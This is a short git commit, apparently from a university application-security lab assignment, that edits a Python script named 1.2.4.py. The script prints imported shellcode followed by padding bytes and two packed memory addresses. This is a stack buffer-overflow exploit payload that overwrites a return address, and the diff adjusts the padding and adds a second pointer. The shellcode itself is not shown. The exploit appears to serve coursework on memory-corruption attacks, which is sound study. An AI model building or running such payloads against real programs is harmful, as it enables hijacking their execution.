8e324cddfefc831a769018940e0d5ed8b4fe3b6e
yhyuan2 <yhyuan2@illinois.edu>
2019-09-11 12:25:50 -0400

    1.2.4

--- AppSec/1.2.4.py
+++ AppSec/1.2.4.py
@@ -2,8 +2,7 @@ from shellcode import shellcode
 from struct import pack
 
 def main():
-	print shellcode + "\x07"*2029 + pack("<I", 0xbffe8c38)
-	#print shellcode
+	print shellcode  + "\x07"*2025 + pack("<I", 0xbffe8c38) + pack("<I", 0xbffe944c)
 
 if __name__ == '__main__':
 	main()
